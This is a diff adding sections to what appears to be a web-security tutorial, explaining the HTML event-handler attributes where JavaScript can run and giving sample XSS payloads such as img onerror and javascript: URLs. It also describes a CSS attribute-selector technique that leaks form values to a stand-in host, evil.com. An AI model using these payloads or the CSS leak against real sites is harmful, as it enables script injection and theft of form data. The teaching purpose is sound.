@@ -99,6 +99,36 @@ Modern JS can:
 
 **Every one of those powers is a potential attack vector** if attacker-controlled JavaScript ends up running on your page.
 
+## Inline JavaScript — the many places code can hide
+
+The `<script>` tag isn't the only place JavaScript lives. HTML has a long list of **event handler attributes** that also run JavaScript directly:
+
+```html
+<img src="x" onerror="alert(1)">
+<body onload="alert(1)">
+<a href="javascript:alert(1)">click me</a>
+<svg onload="alert(1)">
+```
+
+This matters enormously for security: a filter that only strips `<script>` tags but forgets `onerror`, `onload`, or `javascript:` URLs is trivially bypassed. This is exactly why real-world XSS filter bypass lists (which you'll use directly in Path 07 and Path 10) are so long — there are dozens of HTML attributes and contexts that can execute code, not just one. Recognising *all* the places JavaScript can hide in HTML, not just the obvious `<script>` tag, is a genuinely important skill for both finding and defending against XSS.
+
+## CSS selectors and specificity — a quick primer
+
+Beyond the tag/class/id selectors above, CSS has combinators that target elements based on their relationship to others:
+
+```css
+/* Direct child */
+nav > a { color: teal; }
+
+/* Any descendant */
+.sidebar a { font-size: 14px; }
+
+/* Attribute selector — every input whose type is "password" */
+input[type="password"] { border: 2px solid red; }
+```
+
+That last pattern — selecting by attribute — is what powers **CSS-based data exfiltration** attacks: a malicious stylesheet can use attribute selectors like `input[value^="a"]` combined with `background: url(https://evil.com/log?char=a)` to leak a form's value one character at a time, purely through CSS, with no JavaScript involved at all. It's a genuinely surprising attack for people who assume CSS is "just styling" and therefore safe.
+
 ## The security shape of each language
 
 Here's the crucial map, worth pinning to memory:
